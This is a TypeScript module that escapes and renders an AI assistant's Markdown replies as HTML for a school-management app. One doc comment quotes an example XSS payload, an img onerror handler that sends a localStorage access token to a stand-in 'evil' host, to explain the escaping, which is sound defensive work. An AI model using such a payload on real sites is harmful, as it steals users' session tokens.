/**
 * Rendering for AI assistant replies.
 *
 * Extracted from AltrixCopilot so the escaping rules can be tested: this is
 * the only place model output becomes HTML, and its input is not trustworthy.
 */

/**
 * Escape every character that could start markup.
 *
 * The model's reply is rendered with dangerouslySetInnerHTML, and its context is
 * built from school data — student names, message bodies, notice text — which
 * users control. Without this, a pupil named
 * `<img src=x onerror="fetch('//evil/'+localStorage.access_token)">` runs script
 * in the browser of every staff member who asks the assistant about them, and
 * the JWT lives in localStorage.
 *
 * Escaping happens before any formatting, so the only HTML in the output is the
 * markup this function adds itself.
 */
export function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

export function renderMarkdown(text: string): string {
  if (!text || typeof text !== "string") return "";

  // Escape first. Everything below either strips text or inserts markup that
  // this function controls; nothing re-introduces caller-supplied HTML.
  let formatted = escapeHtml(text);

  // Strip any action tags or internal protocol tags. These are matched in their
  // escaped form because escaping already ran.
  formatted = formatted.replace(/&lt;altrix_action&gt;[\s\S]*?&lt;\/altrix_action&gt;/gi, "");
  formatted = formatted.replace(/&lt;altrix_chart[\s\S]*?\/&gt;/gi, "");

  // Strip raw database UUIDs (e.g., 8ea67280-cd68-45fa-bb2a-fa67623910c2)
  const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
  formatted = formatted.replace(uuidPattern, "");

  // Strip bracketed ID expressions like [ID: ...], [Student ID: ...], or (User ID: ...)
  const bracketedIdPattern = /[\[\(][^\]\)]*\bid\b[^\]\)]*[\]\)]/gi;
  formatted = formatted.replace(bracketedIdPattern, "");

  // Strip markdown links [Label](url) -> Label (clean text, no clickable links)
  formatted = formatted.replace(/\[([^\]]+)\]\([^\)]+\)/g, "$1");

  // Strip raw URLs
  formatted = formatted.replace(/https?:\/\/[^\s]+/g, "");
  
  // Handle <think>...</think> block beautifully for reasoning models.
  // Matched in escaped form, since escaping has already run.
  if (formatted.includes("&lt;think&gt;")) {
    if (formatted.includes("&lt;/think&gt;")) {
      formatted = formatted.replace(
        /&lt;think&gt;([\s\S]*?)&lt;\/think&gt;/g,
        '<details class="mb-3 border border-slate-200 rounded-xl bg-slate-50/50 overflow-hidden"><summary class="px-3 py-2 text-[10px] font-semibold text-slate-500 cursor-pointer hover:bg-slate-100 select-none flex items-center gap-1.5">🧠 Thought Process (click to expand)</summary><div class="px-3 pb-3 pt-1 text-[11px] text-slate-500 border-t border-slate-100 bg-white/50 whitespace-pre-wrap leading-relaxed">$1</div></details>'
      );
    } else {
      // Still thinking (unclosed tag during streaming)
      const parts = formatted.split("&lt;think&gt;");
      const beforeThink = parts[0];
      const thinkingContent = parts[1] || "";
      formatted = beforeThink + `<details open class="mb-3 border border-slate-200 rounded-xl bg-slate-50/50 overflow-hidden"><summary class="px-3 py-2 text-[10px] font-semibold text-slate-500 cursor-pointer hover:bg-slate-100 select-none flex items-center gap-1.5">🧠 Thinking...</summary><div class="px-3 pb-3 pt-1 text-[11px] text-slate-500 border-t border-slate-100 bg-white/50 whitespace-pre-wrap leading-relaxed">${thinkingContent}</div></details>`;
    }
  }

  return formatted
    // Bold
    .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
    // Italic
    .replace(/\*(.+?)\*/g, "<em>$1</em>")
    // Inline code
    .replace(/`(.+?)`/g, '<code class="bg-slate-100 text-primary px-1 rounded text-[10px]">$1</code>')
    // Bullet points
    .replace(/^- (.+)$/gm, '<li class="ml-3 list-disc list-outside">$1</li>')
    // Numbered list
    .replace(/^\d+\. (.+)$/gm, '<li class="ml-3 list-decimal list-outside">$1</li>')
    // Headers
    .replace(/^### (.+)$/gm, '<p class="font-bold text-primary mt-2 mb-1 text-[11px] uppercase tracking-wide">$1</p>')
    .replace(/^## (.+)$/gm, '<p class="font-bold text-slate-800 mt-2 mb-1 text-[12px]">$1</p>')
    .replace(/^# (.+)$/gm, '<p class="font-bold text-slate-900 mt-2 mb-1 text-[13px]">$1</p>')
    // Newlines
    .replace(/\n\n/g, '<br/><br/>')
    .replace(/\n/g, '<br/>');
}
